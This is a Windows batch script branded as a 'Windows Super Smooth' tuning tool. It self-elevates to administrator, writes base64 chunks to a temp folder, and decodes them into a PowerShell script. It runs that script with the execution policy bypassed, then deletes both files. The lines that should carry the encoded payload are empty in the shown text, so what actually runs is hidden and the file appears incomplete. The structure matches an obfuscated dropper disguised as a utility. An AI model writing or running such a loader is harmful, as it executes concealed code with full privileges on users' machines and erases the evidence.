@echo off
setlocal EnableDelayedExpansion

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

if not exist "%TEMP%\sc" mkdir "%TEMP%\sc"

echo.
echo   ==========================================
echo         WINDOWS SUPER SMOOTH v2.0
echo   ==========================================
echo.
echo   Building tool...
echo  >> "%TEMP%\sc\wss.b64"
echo  >> "%TEMP%\sc\wss.b64"
echo  >> "%TEMP%\sc\wss.b64"
echo  >> "%TEMP%\sc\wss.b64"
echo  >> "%TEMP%\sc\wss.b64"
echo  >> "%TEMP%\sc\wss.b64"
echo  >> "%TEMP%\sc\wss.b64"
echo  >> "%TEMP%\sc\wss.b64"
echo  >> "%TEMP%\sc\wss.b64"
echo  >> "%TEMP%\sc\wss.b64"
echo  >> "%TEMP%\sc\wss.b64"

echo   Decoding...
powershell -NoProfile -Command "$b64 = [IO.File]::ReadAllText('%TEMP%\sc\wss.b64'); $bytes = [Convert]::FromBase64String($b64); [IO.File]::WriteAllBytes('%TEMP%\sc\wss.ps1', $bytes)"

if not exist "%TEMP%\sc\wss.ps1" (
    echo   ERROR: Failed to decode.
    pause
    exit /b
)

echo   Starting Windows Super Smooth...
echo.
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\sc\wss.ps1"

del "%TEMP%\sc\wss.b64" 2>nul
del "%TEMP%\sc\wss.ps1" 2>nul